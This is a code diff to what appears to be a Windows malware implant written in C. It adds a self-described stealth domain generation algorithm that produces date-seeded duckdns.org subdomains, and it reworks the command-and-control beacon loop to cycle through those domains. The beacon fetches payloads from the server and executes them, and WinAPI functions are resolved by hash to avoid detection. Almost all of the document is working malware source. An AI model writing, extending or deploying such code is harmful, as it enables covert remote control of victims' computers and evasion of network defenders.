@@ -50,6 +50,43 @@ void* custom_memset(void* dest, int value, size_t count) {
 
 #include <windows.h>
 
+
+// Fully stealth DGA using only resolved WinAPI + your FUNCTION_TABLE
+void generate_subdomains_by_date(wchar_t buffer[][32], int count, PFUNCTION_TABLE ft) {
+    SYSTEMTIME st;
+    ft->Kernel32.GetLocalTime(&st);
+
+    // Seed = YYYYMMDD + secret salt
+    DWORD seed = (st.wYear * 10000) + (st.wMonth * 100) + st.wDay;
+
+    // Simple but good enough LCG instead of srand/rand
+    for(int i = 0; i < count; i++) {
+        seed = 1664525 * seed + 1013904223;        // constants from Numerical Recipes
+        DWORD r = (seed >> 16) & 0x7FFF;
+
+        wchar_t subdomain[12] = {0};
+
+        for(int j = 0; j < 12; j++) {
+            seed = 1664525 * seed + 1013904223;
+            r = (seed >> 16) & 0x7FFF;
+            r = r % 62;
+            if (r < 26)
+                subdomain[j] = L'A' + r;        // uppercase
+            else if (r < 52)
+                subdomain[j] = L'a' + (r-26);   // lowercase
+            else
+                subdomain[j] = L'0' + (r-52);   // digits
+        }
+
+        // Copy subdomain into buffer[i]
+        custom_memcpy(buffer[i], subdomain, 24);
+        custom_memcpy(buffer[i] + 12, L".duckdns.org", 24);
+
+        // Null terminate
+        buffer[i][24] = L'\0'; // total 24 chars: 12+12
+    }
+}
+
 void* WriteHex(const uint8_t* data, size_t bytes, PFUNCTION_TABLE ft) {
     if (bytes == 0 || data == NULL)
         return (void*)data;
@@ -250,13 +287,16 @@ void handleModuleExecution(PFUNCTION_TABLE ft, void* payload, DWORD totalSize) {
 
 }
 
-void c2BeaconCommunicate(PFUNCTION_TABLE ft){
+BOOL c2BeaconCommunicate(wchar_t* domain, PFUNCTION_TABLE ft){
     HINTERNET hSession = ft->WinHttp.WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
-    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, L"venexv1.mal", 80, 0);
+    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, domain, 80, 0);
     HINTERNET hRequest = ft->WinHttp.WinHttpOpenRequest(hConnect, L"GET", L"/?beacon=ALIVE", NULL, NULL, NULL, 0);
-    ft->WinHttp.WinHttpAddRequestHeaders(hRequest, L"Cookie: 12E4A4FF050EB700\r\n", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
-    ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
-    ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);
+
+    if (!hSession || !hConnect || !hRequest) {return FALSE;}
+
+    if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, L"Cookie: 12E4A4FF050EB700\r\n", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return FALSE;}
+    if (!ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {return FALSE;}
+    !ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);
 
     BYTE buffer[4096];  // Fixed buffer
     BYTE* buffer_ptr = buffer;
@@ -294,15 +334,16 @@ void c2BeaconCommunicate(PFUNCTION_TABLE ft){
         if(custom_memcmp((char*)(buffer + i), signature, 8) == 0){
             found = TRUE;
             buffer_ptr = buffer + i + 8; // move pointer past the signature
+            break;
         }
     }
 
-    if(!found){return;}
+    if(!found){return TRUE;}
 
     // handle module execution
     handleModuleExecution(ft, buffer_ptr, totalBytesRead - (DWORD)(buffer_ptr - buffer));
 
-    return;
+    return TRUE;
 }
 
 // WinGost API List
@@ -447,6 +488,8 @@ void __main(void) {
     functionTable.Kernel32.SetHandleInformation = getFunctionBase(0x80A469C3, kernel32Base); // hash of "KERNEL32.DLL" + "SetHandleInformation"
     functionTable.Kernel32.ReadFile = getFunctionBase(0x2ABA496E, kernel32Base); // hash of "KERNEL32.DLL" + "ReadFile"
 
+    functionTable.Kernel32.GetLocalTime = getFunctionBase(0x280C4D4B, kernel32Base); // hash of "KERNEL32.DLL" + "GetLocalTime"
+
 
     // functionTable.Kernel32.HeapAlloc = getFunctionBase(0x8024706B, kernel32Base); // hash of "KERNEL32.DLL" + "HeapAlloc"
     // functionTable.Kernel32.HeapFree = getFunctionBase(0xD2A541DC, kernel32Base); // hash of "KERNEL32.DLL" + "HeapFree"
@@ -476,12 +519,25 @@ void __main(void) {
     // Test the resolved functions
     PFUNCTION_TABLE ft = &functionTable;
 
+    wchar_t subdomains[10][32];
+
+    generate_subdomains_by_date(subdomains, 10, ft);
+
+    int i = 0;
     while (1)
     {
-        c2BeaconCommunicate(ft);
+        
         derectSleep(FALSE, 5); // Sleep for 5 seconds before next beacon
+
+        if(c2BeaconCommunicate(subdomains[i], ft)){
+            continue;
+        }
+
+        i++;
+        if(i > 9){
+            i = 0;
+        }
     }
-    
     
 
     ft->Kernel32.ExitProcess(0);
